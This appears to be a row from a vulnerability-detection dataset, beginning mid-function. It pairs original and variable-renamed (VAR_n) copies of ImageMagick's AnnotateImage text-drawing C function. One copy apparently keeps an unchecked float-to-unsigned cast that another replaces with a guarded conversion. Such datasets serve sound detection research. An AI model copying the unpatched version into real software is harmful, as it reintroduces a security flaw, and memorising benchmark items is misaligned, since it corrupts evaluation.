offset.y=(geometry.height == 0 ? 1.0 : -1.0)*annotate_info->affine.ty+
geometry.height+i*annotate_info->affine.sy*height-
annotate_info->affine.sy*(number_lines-1.0)*height+metrics.descent;
break;
}
case (GravityType) SouthGravity:
{
offset.x=(geometry.width == 0 ? -1.0 : 1.0)*annotate_info->affine.tx+
geometry.width/2.0+i*annotate_info->affine.ry*height-
annotate_info->affine.sx*metrics.width/2.0-
annotate_info->affine.ry*(number_lines-1.0)*height/2.0;
offset.y=(geometry.height == 0 ? 1.0 : -1.0)*annotate_info->affine.ty+
geometry.height+i*annotate_info->affine.sy*height-
annotate_info->affine.rx*metrics.width/2.0-
annotate_info->affine.sy*(number_lines-1.0)*height+metrics.descent;
break;
}
case (GravityType) SouthEastGravity:
{
offset.x=(geometry.width == 0 ? 1.0 : -1.0)*annotate_info->affine.tx+
geometry.width+i*annotate_info->affine.ry*height-
annotate_info->affine.sx*metrics.width-
annotate_info->affine.ry*(number_lines-1.0)*height-1.0;
offset.y=(geometry.height == 0 ? 1.0 : -1.0)*annotate_info->affine.ty+
geometry.height+i*annotate_info->affine.sy*height-
annotate_info->affine.rx*metrics.width-
annotate_info->affine.sy*(number_lines-1.0)*height+metrics.descent;
break;
}
}
switch (annotate->align)
{
case LeftAlign:
{
offset.x=annotate_info->affine.tx+i*annotate_info->affine.ry*height;
offset.y=annotate_info->affine.ty+i*annotate_info->affine.sy*height;
break;
}
case CenterAlign:
{
offset.x=annotate_info->affine.tx+i*annotate_info->affine.ry*height-
annotate_info->affine.sx*metrics.width/2.0;
offset.y=annotate_info->affine.ty+i*annotate_info->affine.sy*height-
annotate_info->affine.rx*metrics.width/2.0;
break;
}
case RightAlign:
{
offset.x=annotate_info->affine.tx+i*annotate_info->affine.ry*height-
annotate_info->affine.sx*metrics.width;
offset.y=annotate_info->affine.ty+i*annotate_info->affine.sy*height-
annotate_info->affine.rx*metrics.width;
break;
}
default:
break;
}
if (draw_info->undercolor.alpha != TransparentAlpha)
{
DrawInfo
*undercolor_info;
undercolor_info=CloneDrawInfo((ImageInfo *) NULL,(DrawInfo *) NULL);
undercolor_info->fill=draw_info->undercolor;
undercolor_info->affine=draw_info->affine;
undercolor_info->affine.tx=offset.x-draw_info->affine.ry*metrics.ascent;
undercolor_info->affine.ty=offset.y-draw_info->affine.sy*metrics.ascent;
(void) FormatLocaleString(primitive,MagickPathExtent,
""rectangle 0.0,0.0 %g,%g"",metrics.origin.x,(double) height);
(void) CloneString(&undercolor_info->primitive,primitive);
(void) DrawImage(image,undercolor_info,exception);
(void) DestroyDrawInfo(undercolor_info);
}
annotate_info->affine.tx=offset.x;
annotate_info->affine.ty=offset.y;
pixel=annotate_info->fill;
if (annotate_info->stroke.alpha != TransparentAlpha)
pixel=annotate_info->stroke;
(void) QueryColorname(image,&pixel,AllCompliance,color,exception);
(void) FormatLocaleString(primitive,MagickPathExtent,""stroke %s ""
""stroke-width %g line 0,0 %g,0"",color,(double)
metrics.underline_thickness,(double) metrics.width);
switch (annotate->decorate)
{
case OverlineDecoration:
{
annotate_info->affine.ty-=(draw_info->affine.sy*(metrics.ascent+
metrics.descent-metrics.underline_position));
(void) CloneString(&annotate_info->primitive,primitive);
(void) DrawImage(image,annotate_info,exception);
break;
}
case UnderlineDecoration:
{
annotate_info->affine.ty-=(draw_info->affine.sy*
metrics.underline_position);
(void) CloneString(&annotate_info->primitive,primitive);
(void) DrawImage(image,annotate_info,exception);
break;
}
default:
break;
}
status=RenderType(image,annotate,&offset,&metrics,exception);
if (status == MagickFalse)
break;
if (annotate->decorate == LineThroughDecoration) {
annotate_info->affine.ty-=(draw_info->affine.sy*(height+
metrics.underline_position+metrics.descent*2)/2.0);
(void) CloneString(&annotate_info->primitive,primitive);
(void) DrawImage(image,annotate_info,exception);
}
}
annotate_info=DestroyDrawInfo(annotate_info);
annotate=DestroyDrawInfo(annotate);
textlist=(char **) RelinquishMagickMemory(textlist);
text=DestroyString(text);
return(status);
}","MagickExport VAR_0 AnnotateImage(Image *VAR_1,
const DrawInfo *VAR_2,ExceptionInfo *VAR_3)
{
char
*VAR_4,
VAR_5[VAR_6],
VAR_7[VAR_6],
*VAR_8,
**VAR_9;
DrawInfo
*VAR_10,
*VAR_11;
GeometryInfo
VAR_12;
MagickBooleanType
VAR_13;
PixelInfo
VAR_14;
PointInfo
VAR_15;
RectangleInfo
VAR_16;
ssize_t
VAR_17;
TypeMetric
VAR_18;
size_t
VAR_19,
VAR_20;
assert(VAR_1 != (Image *) NULL);
assert(VAR_1->signature == VAR_21);
if (IsEventLogging() != VAR_22)
(void) LogMagickEvent(VAR_23,GetMagickModule(),""%s"",VAR_1->filename);
assert(VAR_2 != (DrawInfo *) NULL);
assert(VAR_2->signature == VAR_21);
if (VAR_2->text == (char *) NULL)
return(VAR_22);
if (*VAR_2->text == '\0')
return(VAR_24);
VAR_10=CloneDrawInfo((ImageInfo *) NULL,VAR_2);
VAR_8=VAR_10->text;
VAR_10->text=(char *) NULL;
VAR_11=CloneDrawInfo((ImageInfo *) NULL,VAR_2);
VAR_20=1;
for (VAR_4=VAR_8; *VAR_4 != '\0'; VAR_4++)
if (*VAR_4 == '\n')
VAR_20++;
VAR_9=(char **) AcquireQuantumMemory(VAR_20+1,sizeof(*VAR_9));
if (VAR_9 == (char **) NULL)
{
VAR_11=DestroyDrawInfo(VAR_11);
VAR_10=DestroyDrawInfo(VAR_10);
VAR_8=DestroyString(VAR_8);
return(VAR_22);
}
VAR_4=VAR_8;
for (VAR_17=0; VAR_17 < (ssize_t) VAR_20; VAR_17++)
{
char
*VAR_25;
VAR_9[VAR_17]=VAR_4;
for (VAR_25=VAR_4; *VAR_25 != '\0'; VAR_25++)
if ((*VAR_25 == '\r') || (*VAR_25 == '\n'))
break;
if (*VAR_25 == '\r')
{
*VAR_25='\0';
VAR_25++;
}
*VAR_25='\0';
VAR_4=VAR_25+1;
}
VAR_9[VAR_17]=(char *) NULL;
SetGeometry(VAR_1,&VAR_16);
SetGeometryInfo(&VAR_12);
if (VAR_11->geometry != (char *) NULL)
{
(void) ParsePageGeometry(VAR_1,VAR_11->geometry,&VAR_16,
VAR_3);
(void) ParseGeometry(VAR_11->geometry,&VAR_12);
}
if (SetImageStorageClass(VAR_1,VAR_26,VAR_3) == VAR_22)
{
VAR_11=DestroyDrawInfo(VAR_11);
VAR_10=DestroyDrawInfo(VAR_10);
VAR_9=(char **) RelinquishMagickMemory(VAR_9);
VAR_8=DestroyString(VAR_8);
return(VAR_22);
}
if (IsGrayColorspace(VAR_1->colorspace) != VAR_22)
(void) SetImageColorspace(VAR_1,VAR_27,VAR_3);
VAR_13=VAR_24;
(void) memset(&VAR_18,0,sizeof(VAR_18));
for (VAR_17=0; VAR_9[VAR_17] != (char *) NULL; VAR_17++)
{
if (*VAR_9[VAR_17] == '\0')
continue;
VAR_11->affine.tx=VAR_12.xi-VAR_1->page.x;
VAR_11->affine.ty=VAR_12.psi-VAR_1->page.y;
(void) CloneString(&VAR_10->text,VAR_9[VAR_17]);
if ((VAR_18.width == 0) || (VAR_10->gravity != VAR_28))
(void) GetTypeMetrics(VAR_1,VAR_10,&VAR_18,VAR_3);
VAR_19=(size_t) floor(VAR_18.ascent-VAR_18.descent+0.5);
if (VAR_19 == 0)
VAR_19=VAR_2->pointsize;
VAR_19+=(size_t) floor(VAR_2->interline_spacing+0.5);
switch (VAR_10->gravity)
{
case VAR_29:
default:
{
VAR_15.x=VAR_11->affine.tx+VAR_17*VAR_11->affine.ry*VAR_19;
VAR_15.y=VAR_11->affine.ty+VAR_17*VAR_11->affine.sy*VAR_19;
break;
}
case (GravityType) VAR_28:
{
VAR_15.x=(VAR_16.width == 0 ? -1.0 : 1.0)*VAR_11->affine.tx+VAR_17*
VAR_11->affine.ry*VAR_19+VAR_11->affine.ry*
(VAR_18.ascent+VAR_18.descent);
VAR_15.y=(VAR_16.height == 0 ? -1.0 : 1.0)*VAR_11->affine.ty+VAR_17*
VAR_11->affine.sy*VAR_19+VAR_11->affine.sy*
VAR_18.ascent;
break;
}
case (GravityType) VAR_30:
{
VAR_15.x=(VAR_16.width == 0 ? -1.0 : 1.0)*VAR_11->affine.tx+
VAR_16.width/2.0+VAR_17*VAR_11->affine.ry*VAR_19-
VAR_11->affine.sx*VAR_18.width/2.0+VAR_11->affine.ry*
(VAR_18.ascent+VAR_18.descent);
VAR_15.y=(VAR_16.height == 0 ? -1.0 : 1.0)*VAR_11->affine.ty+VAR_17*
VAR_11->affine.sy*VAR_19+VAR_11->affine.sy*
VAR_18.ascent-VAR_11->affine.rx*VAR_18.width/2.0;
break;
}
case (GravityType) VAR_31:
{
VAR_15.x=(VAR_16.width == 0 ? 1.0 : -1.0)*VAR_11->affine.tx+
VAR_16.width+VAR_17*VAR_11->affine.ry*VAR_19-
VAR_11->affine.sx*VAR_18.width+VAR_11->affine.ry*
(VAR_18.ascent+VAR_18.descent)-1.0;
VAR_15.y=(VAR_16.height == 0 ? -1.0 : 1.0)*VAR_11->affine.ty+VAR_17*
VAR_11->affine.sy*VAR_19+VAR_11->affine.sy*
VAR_18.ascent-VAR_11->affine.rx*VAR_18.width;
break;
}
case (GravityType) VAR_32:
{
VAR_15.x=(VAR_16.width == 0 ? -1.0 : 1.0)*VAR_11->affine.tx+VAR_17*
VAR_11->affine.ry*VAR_19+VAR_11->affine.ry*
(VAR_18.ascent+VAR_18.descent-(VAR_20-1.0)*VAR_19)/2.0;
VAR_15.y=(VAR_16.height == 0 ? -1.0 : 1.0)*VAR_11->affine.ty+
VAR_16.height/2.0+VAR_17*VAR_11->affine.sy*VAR_19+
VAR_11->affine.sy*(VAR_18.ascent+VAR_18.descent-
(VAR_20-1.0)*VAR_19)/2.0;
break;
}
case (GravityType) VAR_33:
{
VAR_15.x=(VAR_16.width == 0 ? -1.0 : 1.0)*VAR_11->affine.tx+
VAR_16.width/2.0+VAR_17*VAR_11->affine.ry*VAR_19-
VAR_11->affine.sx*VAR_18.width/2.0+VAR_11->affine.ry*
(VAR_18.ascent+VAR_18.descent-(VAR_20-1.0)*VAR_19)/2.0;
VAR_15.y=(VAR_16.height == 0 ? -1.0 : 1.0)*VAR_11->affine.ty+
VAR_16.height/2.0+VAR_17*VAR_11->affine.sy*VAR_19-
VAR_11->affine.rx*VAR_18.width/2.0+VAR_11->affine.sy*
(VAR_18.ascent+VAR_18.descent-(VAR_20-1.0)*VAR_19)/2.0;
break;
}
case (GravityType) VAR_34:
{
VAR_15.x=(VAR_16.width == 0 ? 1.0 : -1.0)*VAR_11->affine.tx+
VAR_16.width+VAR_17*VAR_11->affine.ry*VAR_19-
VAR_11->affine.sx*VAR_18.width+
VAR_11->affine.ry*(VAR_18.ascent+VAR_18.descent-
(VAR_20-1.0)*VAR_19)/2.0-1.0;
VAR_15.y=(VAR_16.height == 0 ? -1.0 : 1.0)*VAR_11->affine.ty+
VAR_16.height/2.0+VAR_17*VAR_11->affine.sy*VAR_19-
VAR_11->affine.rx*VAR_18.width+
VAR_11->affine.sy*(VAR_18.ascent+VAR_18.descent-
(VAR_20-1.0)*VAR_19)/2.0;
break;
}
case (GravityType) VAR_35:
{
VAR_15.x=(VAR_16.width == 0 ? -1.0 : 1.0)*VAR_11->affine.tx+VAR_17*
VAR_11->affine.ry*VAR_19-VAR_11->affine.ry*
(VAR_20-1.0)*VAR_19;
VAR_15.y=(VAR_16.height == 0 ? 1.0 : -1.0)*VAR_11->affine.ty+
VAR_16.height+VAR_17*VAR_11->affine.sy*VAR_19-
VAR_11->affine.sy*(VAR_20-1.0)*VAR_19+VAR_18.descent;
break;
}
case (GravityType) VAR_36:
{
VAR_15.x=(VAR_16.width == 0 ? -1.0 : 1.0)*VAR_11->affine.tx+
VAR_16.width/2.0+VAR_17*VAR_11->affine.ry*VAR_19-
VAR_11->affine.sx*VAR_18.width/2.0-
VAR_11->affine.ry*(VAR_20-1.0)*VAR_19/2.0;
VAR_15.y=(VAR_16.height == 0 ? 1.0 : -1.0)*VAR_11->affine.ty+
VAR_16.height+VAR_17*VAR_11->affine.sy*VAR_19-
VAR_11->affine.rx*VAR_18.width/2.0-
VAR_11->affine.sy*(VAR_20-1.0)*VAR_19+VAR_18.descent;
break;
}
case (GravityType) VAR_37:
{
VAR_15.x=(VAR_16.width == 0 ? 1.0 : -1.0)*VAR_11->affine.tx+
VAR_16.width+VAR_17*VAR_11->affine.ry*VAR_19-
VAR_11->affine.sx*VAR_18.width-
VAR_11->affine.ry*(VAR_20-1.0)*VAR_19-1.0;
VAR_15.y=(VAR_16.height == 0 ? 1.0 : -1.0)*VAR_11->affine.ty+
VAR_16.height+VAR_17*VAR_11->affine.sy*VAR_19-
VAR_11->affine.rx*VAR_18.width-
VAR_11->affine.sy*(VAR_20-1.0)*VAR_19+VAR_18.descent;
break;
}
}
switch (VAR_10->align)
{
case VAR_38:
{
VAR_15.x=VAR_11->affine.tx+VAR_17*VAR_11->affine.ry*VAR_19;
VAR_15.y=VAR_11->affine.ty+VAR_17*VAR_11->affine.sy*VAR_19;
break;
}
case VAR_39:
{
VAR_15.x=VAR_11->affine.tx+VAR_17*VAR_11->affine.ry*VAR_19-
VAR_11->affine.sx*VAR_18.width/2.0;
VAR_15.y=VAR_11->affine.ty+VAR_17*VAR_11->affine.sy*VAR_19-
VAR_11->affine.rx*VAR_18.width/2.0;
break;
}
case VAR_40:
{
VAR_15.x=VAR_11->affine.tx+VAR_17*VAR_11->affine.ry*VAR_19-
VAR_11->affine.sx*VAR_18.width;
VAR_15.y=VAR_11->affine.ty+VAR_17*VAR_11->affine.sy*VAR_19-
VAR_11->affine.rx*VAR_18.width;
break;
}
default:
break;
}
if (VAR_2->undercolor.alpha != VAR_41)
{
DrawInfo
*VAR_42;
VAR_42=CloneDrawInfo((ImageInfo *) NULL,(DrawInfo *) NULL);
VAR_42->fill=VAR_2->undercolor;
VAR_42->affine=VAR_2->affine;
VAR_42->affine.tx=VAR_15.x-VAR_2->affine.ry*VAR_18.ascent;
VAR_42->affine.ty=VAR_15.y-VAR_2->affine.sy*VAR_18.ascent;
(void) FormatLocaleString(VAR_7,VAR_6,
""rectangle 0.0,0.0 %g,%g"",VAR_18.origin.x,(double) VAR_19);
(void) CloneString(&VAR_42->primitive,VAR_7);
(void) DrawImage(VAR_1,VAR_42,VAR_3);
(void) DestroyDrawInfo(VAR_42);
}
VAR_11->affine.tx=VAR_15.x;
VAR_11->affine.ty=VAR_15.y;
VAR_14=VAR_11->fill;
if (VAR_11->stroke.alpha != VAR_41)
VAR_14=VAR_11->stroke;
(void) QueryColorname(VAR_1,&VAR_14,VAR_43,VAR_5,VAR_3);
(void) FormatLocaleString(VAR_7,VAR_6,""stroke %s ""
""stroke-width %g line 0,0 %g,0"",VAR_5,(double)
VAR_18.underline_thickness,(double) VAR_18.width);
switch (VAR_10->decorate)
{
case VAR_44:
{
VAR_11->affine.ty-=(VAR_2->affine.sy*(VAR_18.ascent+
VAR_18.descent-VAR_18.underline_position));
(void) CloneString(&VAR_11->primitive,VAR_7);
(void) DrawImage(VAR_1,VAR_11,VAR_3);
break;
}
case VAR_45:
{
VAR_11->affine.ty-=(VAR_2->affine.sy*
VAR_18.underline_position);
(void) CloneString(&VAR_11->primitive,VAR_7);
(void) DrawImage(VAR_1,VAR_11,VAR_3);
break;
}
default:
break;
}
VAR_13=RenderType(VAR_1,VAR_10,&VAR_15,&VAR_18,VAR_3);
if (VAR_13 == VAR_22)
break;
if (VAR_10->decorate == VAR_46) {
VAR_11->affine.ty-=(VAR_2->affine.sy*(VAR_19+
VAR_18.underline_position+VAR_18.descent*2)/2.0);
(void) CloneString(&VAR_11->primitive,VAR_7);
(void) DrawImage(VAR_1,VAR_11,VAR_3);
}
}
VAR_11=DestroyDrawInfo(VAR_11);
VAR_10=DestroyDrawInfo(VAR_10);
VAR_9=(char **) RelinquishMagickMemory(VAR_9);
VAR_8=DestroyString(VAR_8);
return(VAR_13);
}",,"MagickExport MagickBooleanType AnnotateImage(Image *image,
  const DrawInfo *draw_info,ExceptionInfo *exception)
{
  char
    *p,
    color[MagickPathExtent],
    primitive[MagickPathExtent],
    *text,
    **textlist;

  DrawInfo
    *annotate,
    *annotate_info;

  GeometryInfo
    geometry_info;

  MagickBooleanType
    status;

  PixelInfo
    pixel;

  PointInfo
    offset;

  RectangleInfo
    geometry;

  ssize_t
    i;

  TypeMetric
    metrics;

  size_t
    height,
    number_lines;

  assert(image != (Image *) NULL);
  assert(image->signature == MagickCoreSignature);
  if (IsEventLogging() != MagickFalse)
    (void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",image->filename);
  assert(draw_info != (DrawInfo *) NULL);
  assert(draw_info->signature == MagickCoreSignature);
  if (draw_info->text == (char *) NULL)
    return(MagickFalse);
  if (*draw_info->text == '\0')
    return(MagickTrue);
  annotate=CloneDrawInfo((ImageInfo *) NULL,draw_info);
  text=annotate->text;
  annotate->text=(char *) NULL;
  annotate_info=CloneDrawInfo((ImageInfo *) NULL,draw_info);
  number_lines=1;
  for (p=text; *p != '\0'; p++)
    if (*p == '\n')
      number_lines++;
  textlist=(char **) AcquireQuantumMemory(number_lines+1,sizeof(*textlist));
  if (textlist == (char **) NULL)
    {
      annotate_info=DestroyDrawInfo(annotate_info);
      annotate=DestroyDrawInfo(annotate);
      text=DestroyString(text);
      return(MagickFalse);
    }
  p=text;
  for (i=0; i < (ssize_t) number_lines; i++)
  {
    char
      *q;

    textlist[i]=p;
    for (q=p; *q != '\0'; q++)
      if ((*q == '\r') || (*q == '\n'))
        break;
    if (*q == '\r')
      {
        *q='\0';
        q++;
      }
    *q='\0';
    p=q+1;
  }
  textlist[i]=(char *) NULL;
  SetGeometry(image,&geometry);
  SetGeometryInfo(&geometry_info);
  if (annotate_info->geometry != (char *) NULL)
    {
      (void) ParsePageGeometry(image,annotate_info->geometry,&geometry,
        exception);
      (void) ParseGeometry(annotate_info->geometry,&geometry_info);
    }
  if (SetImageStorageClass(image,DirectClass,exception) == MagickFalse)
    {
      annotate_info=DestroyDrawInfo(annotate_info);
      annotate=DestroyDrawInfo(annotate);
      textlist=(char **) RelinquishMagickMemory(textlist);
      text=DestroyString(text);
      return(MagickFalse);
    }
  if (IsGrayColorspace(image->colorspace) != MagickFalse)
    (void) SetImageColorspace(image,sRGBColorspace,exception);
  status=MagickTrue;
  (void) memset(&metrics,0,sizeof(metrics));
  for (i=0; textlist[i] != (char *) NULL; i++)
  {
    if (*textlist[i] == '\0')
      continue;
    /*
      Position text relative to image.
    */
    annotate_info->affine.tx=geometry_info.xi-image->page.x;
    annotate_info->affine.ty=geometry_info.psi-image->page.y;
    (void) CloneString(&annotate->text,textlist[i]);
    if ((metrics.width == 0) || (annotate->gravity != NorthWestGravity))
      (void) GetTypeMetrics(image,annotate,&metrics,exception);
    height=CastDoubleToUnsigned(metrics.ascent-metrics.descent+0.5);
    if (height == 0)
      height=draw_info->pointsize;
    height+=(size_t) floor(draw_info->interline_spacing+0.5);
    switch (annotate->gravity)
    {
      case UndefinedGravity:
      default:
      {
        offset.x=annotate_info->affine.tx+i*annotate_info->affine.ry*height;
        offset.y=annotate_info->affine.ty+i*annotate_info->affine.sy*height;
        break;
      }
      case (GravityType) NorthWestGravity:
      {
        offset.x=(geometry.width == 0 ? -1.0 : 1.0)*annotate_info->affine.tx+i*
          annotate_info->affine.ry*height+annotate_info->affine.ry*
          (metrics.ascent+metrics.descent);
        offset.y=(geometry.height == 0 ? -1.0 : 1.0)*annotate_info->affine.ty+i*
          annotate_info->affine.sy*height+annotate_info->affine.sy*
          metrics.ascent;
        break;
      }
      case (GravityType) NorthGravity:
      {
        offset.x=(geometry.width == 0 ? -1.0 : 1.0)*annotate_info->affine.tx+
          geometry.width/2.0+i*annotate_info->affine.ry*height-
          annotate_info->affine.sx*metrics.width/2.0+annotate_info->affine.ry*
          (metrics.ascent+metrics.descent);
        offset.y=(geometry.height == 0 ? -1.0 : 1.0)*annotate_info->affine.ty+i*
          annotate_info->affine.sy*height+annotate_info->affine.sy*
          metrics.ascent-annotate_info->affine.rx*metrics.width/2.0;
        break;
      }
      case (GravityType) NorthEastGravity:
      {
        offset.x=(geometry.width == 0 ? 1.0 : -1.0)*annotate_info->affine.tx+
          geometry.width+i*annotate_info->affine.ry*height-
          annotate_info->affine.sx*metrics.width+annotate_info->affine.ry*
          (metrics.ascent+metrics.descent)-1.0;
        offset.y=(geometry.height == 0 ? -1.0 : 1.0)*annotate_info->affine.ty+i*
          annotate_info->affine.sy*height+annotate_info->affine.sy*
          metrics.ascent-annotate_info->affine.rx*metrics.width;
        break;
      }
      case (GravityType) WestGravity:
      {
        offset.x=(geometry.width == 0 ? -1.0 : 1.0)*annotate_info->affine.tx+i*
          annotate_info->affine.ry*height+annotate_info->affine.ry*
          (metrics.ascent+metrics.descent-(number_lines-1.0)*height)/2.0;
        offset.y=(geometry.height == 0 ? -1.0 : 1.0)*annotate_info->affine.ty+
          geometry.height/2.0+i*annotate_info->affine.sy*height+
          annotate_info->affine.sy*(metrics.ascent+metrics.descent-
          (number_lines-1.0)*height)/2.0;
        break;
      }
      case (GravityType) CenterGravity:
      {
        offset.x=(geometry.width == 0 ? -1.0 : 1.0)*annotate_info->affine.tx+
          geometry.width/2.0+i*annotate_info->affine.ry*height-
          annotate_info->affine.sx*metrics.width/2.0+annotate_info->affine.ry*
          (metrics.ascent+metrics.descent-(number_lines-1.0)*height)/2.0;
        offset.y=(geometry.height == 0 ? -1.0 : 1.0)*annotate_info->affine.ty+
          geometry.height/2.0+i*annotate_info->affine.sy*height-
          annotate_info->affine.rx*metrics.width/2.0+annotate_info->affine.sy*
          (metrics.ascent+metrics.descent-(number_lines-1.0)*height)/2.0;
        break;
      }
      case (GravityType) EastGravity:
      {
        offset.x=(geometry.width == 0 ? 1.0 : -1.0)*annotate_info->affine.tx+
          geometry.width+i*annotate_info->affine.ry*height-
          annotate_info->affine.sx*metrics.width+
          annotate_info->affine.ry*(metrics.ascent+metrics.descent-
          (number_lines-1.0)*height)/2.0-1.0;
        offset.y=(geometry.height == 0 ? -1.0 : 1.0)*annotate_info->affine.ty+
          geometry.height/2.0+i*annotate_info->affine.sy*height-
          annotate_info->affine.rx*metrics.width+
          annotate_info->affine.sy*(metrics.ascent+metrics.descent-
          (number_lines-1.0)*height)/2.0;
        break;
      }
      case (GravityType) SouthWestGravity:
      {
        offset.x=(geometry.width == 0 ? -1.0 : 1.0)*annotate_info->affine.tx+i*
          annotate_info->affine.ry*height-annotate_info->affine.ry*
          (number_lines-1.0)*height;
        offset.y=(geometry.height == 0 ? 1.0 : -1.0)*annotate_info->affine.ty+
          geometry.height+i*annotate_info->affine.sy*height-
          annotate_info->affine.sy*(number_lines-1.0)*height+metrics.descent;
        break;
      }
      case (GravityType) SouthGravity:
      {
        offset.x=(geometry.width == 0 ? -1.0 : 1.0)*annotate_info->affine.tx+
          geometry.width/2.0+i*annotate_info->affine.ry*height-
          annotate_info->affine.sx*metrics.width/2.0-
          annotate_info->affine.ry*(number_lines-1.0)*height/2.0;
        offset.y=(geometry.height == 0 ? 1.0 : -1.0)*annotate_info->affine.ty+
          geometry.height+i*annotate_info->affine.sy*height-
          annotate_info->affine.rx*metrics.width/2.0-
          annotate_info->affine.sy*(number_lines-1.0)*height+metrics.descent;
        break;
      }
      case (GravityType) SouthEastGravity:
      {
        offset.x=(geometry.width == 0 ? 1.0 : -1.0)*annotate_info->affine.tx+
          geometry.width+i*annotate_info->affine.ry*height-
          annotate_info->affine.sx*metrics.width-
          annotate_info->affine.ry*(number_lines-1.0)*height-1.0;
        offset.y=(geometry.height == 0 ? 1.0 : -1.0)*annotate_info->affine.ty+
          geometry.height+i*annotate_info->affine.sy*height-
          annotate_info->affine.rx*metrics.width-
          annotate_info->affine.sy*(number_lines-1.0)*height+metrics.descent;
        break;
      }
    }
    switch (annotate->align)
    {
      case LeftAlign:
      {
        offset.x=annotate_info->affine.tx+i*annotate_info->affine.ry*height;
        offset.y=annotate_info->affine.ty+i*annotate_info->affine.sy*height;
        break;
      }
      case CenterAlign:
      {
        offset.x=annotate_info->affine.tx+i*annotate_info->affine.ry*height-
          annotate_info->affine.sx*metrics.width/2.0;
        offset.y=annotate_info->affine.ty+i*annotate_info->affine.sy*height-
          annotate_info->affine.rx*metrics.width/2.0;
        break;
      }
      case RightAlign:
      {
        offset.x=annotate_info->affine.tx+i*annotate_info->affine.ry*height-
          annotate_info->affine.sx*metrics.width;
        offset.y=annotate_info->affine.ty+i*annotate_info->affine.sy*height-
          annotate_info->affine.rx*metrics.width;
        break;
      }
      default:
        break;
    }
    if (draw_info->undercolor.alpha != TransparentAlpha)
      {
        DrawInfo
          *undercolor_info;

        /*
          Text box.
        */
        undercolor_info=CloneDrawInfo((ImageInfo *) NULL,(DrawInfo *) NULL);
        undercolor_info->fill=draw_info->undercolor;
        undercolor_info->affine=draw_info->affine;
        undercolor_info->affine.tx=offset.x-draw_info->affine.ry*metrics.ascent;
        undercolor_info->affine.ty=offset.y-draw_info->affine.sy*metrics.ascent;
        (void) FormatLocaleString(primitive,MagickPathExtent,
          ""rectangle 0.0,0.0 %g,%g"",metrics.origin.x,(double) height);
        (void) CloneString(&undercolor_info->primitive,primitive);
        (void) DrawImage(image,undercolor_info,exception);
        (void) DestroyDrawInfo(undercolor_info);
      }
    annotate_info->affine.tx=offset.x;
    annotate_info->affine.ty=offset.y;
    pixel=annotate_info->fill;
    if (annotate_info->stroke.alpha != TransparentAlpha)
      pixel=annotate_info->stroke;
    (void) QueryColorname(image,&pixel,AllCompliance,color,exception);
    (void) FormatLocaleString(primitive,MagickPathExtent,""stroke %s ""
      ""stroke-width %g line 0,0 %g,0"",color,(double)
      metrics.underline_thickness,(double) metrics.width);
    /*
      Annotate image with text.
    */
    switch (annotate->decorate)
    {
      case OverlineDecoration:
      {
        annotate_info->affine.ty-=(draw_info->affine.sy*(metrics.ascent+
          metrics.descent-metrics.underline_position));
        (void) CloneString(&annotate_info->primitive,primitive);
        (void) DrawImage(image,annotate_info,exception);
        break;
      }
      case UnderlineDecoration:
      {
        annotate_info->affine.ty-=(draw_info->affine.sy*
          metrics.underline_position);
        (void) CloneString(&annotate_info->primitive,primitive);
        (void) DrawImage(image,annotate_info,exception);
        break;
      }
      default:
        break;
    }
    status=RenderType(image,annotate,&offset,&metrics,exception);
    if (status == MagickFalse)
      break;

    if (annotate->decorate == LineThroughDecoration) {
        annotate_info->affine.ty-=(draw_info->affine.sy*(height+
          metrics.underline_position+metrics.descent*2)/2.0);
        (void) CloneString(&annotate_info->primitive,primitive);
        (void) DrawImage(image,annotate_info,exception);
    }
  }
  /*
    Relinquish resources.
  */
  annotate_info=DestroyDrawInfo(annotate_info);
  annotate=DestroyDrawInfo(annotate);
  textlist=(char **) RelinquishMagickMemory(textlist);
  text=DestroyString(text);
  return(status);
}","MagickExport VAR_0 AnnotateImage(Image *VAR_1,
  const DrawInfo *VAR_2,ExceptionInfo *VAR_3)
{
  char
    *VAR_4,
    VAR_5[VAR_6],
    VAR_7[VAR_6],
    *VAR_8,
    **VAR_9;

  DrawInfo
    *VAR_10,
    *VAR_11;

  GeometryInfo
    VAR_12;

  MagickBooleanType
    VAR_13;

  PixelInfo
    VAR_14;

  PointInfo
    VAR_15;

  RectangleInfo
    VAR_16;

  ssize_t
    VAR_17;

  TypeMetric
    VAR_18;

  size_t
    VAR_19,
    VAR_20;

  assert(VAR_1 != (Image *) NULL);
  assert(VAR_1->signature == VAR_21);
  if (IsEventLogging() != VAR_22)
    (void) LogMagickEvent(VAR_23,GetMagickModule(),""%s"",VAR_1->filename);
  assert(VAR_2 != (DrawInfo *) NULL);
  assert(VAR_2->signature == VAR_21);
  if (VAR_2->text == (char *) NULL)
    return(VAR_22);
  if (*VAR_2->text == '\0')
    return(VAR_24);
  VAR_10=CloneDrawInfo((ImageInfo *) NULL,VAR_2);
  VAR_8=VAR_10->text;
  VAR_10->text=(char *) NULL;
  VAR_11=CloneDrawInfo((ImageInfo *) NULL,VAR_2);
  VAR_20=1;
  for (VAR_4=VAR_8; *VAR_4 != '\0'; VAR_4++)
    if (*VAR_4 == '\n')
      VAR_20++;
  VAR_9=(char **) AcquireQuantumMemory(VAR_20+1,sizeof(*VAR_9));
  if (VAR_9 == (char **) NULL)
    {
      VAR_11=DestroyDrawInfo(VAR_11);
      VAR_10=DestroyDrawInfo(VAR_10);
      VAR_8=DestroyString(VAR_8);
      return(VAR_22);
    }
  VAR_4=VAR_8;
  for (VAR_17=0; VAR_17 < (ssize_t) VAR_20; VAR_17++)
  {
    char
      *VAR_25;

    VAR_9[VAR_17]=VAR_4;
    for (VAR_25=VAR_4; *VAR_25 != '\0'; VAR_25++)
      if ((*VAR_25 == '\r') || (*VAR_25 == '\n'))
        break;
    if (*VAR_25 == '\r')
      {
        *VAR_25='\0';
        VAR_25++;
      }
    *VAR_25='\0';
    VAR_4=VAR_25+1;
  }
  VAR_9[VAR_17]=(char *) NULL;
  SetGeometry(VAR_1,&VAR_16);
  SetGeometryInfo(&VAR_12);
  if (VAR_11->geometry != (char *) NULL)
    {
      (void) ParsePageGeometry(VAR_1,VAR_11->geometry,&VAR_16,
        VAR_3);
      (void) ParseGeometry(VAR_11->geometry,&VAR_12);
    }
  if (SetImageStorageClass(VAR_1,VAR_26,VAR_3) == VAR_22)
    {
      VAR_11=DestroyDrawInfo(VAR_11);
      VAR_10=DestroyDrawInfo(VAR_10);
      VAR_9=(char **) RelinquishMagickMemory(VAR_9);
      VAR_8=DestroyString(VAR_8);
      return(VAR_22);
    }
  if (IsGrayColorspace(VAR_1->colorspace) != VAR_22)
    (void) SetImageColorspace(VAR_1,VAR_27,VAR_3);
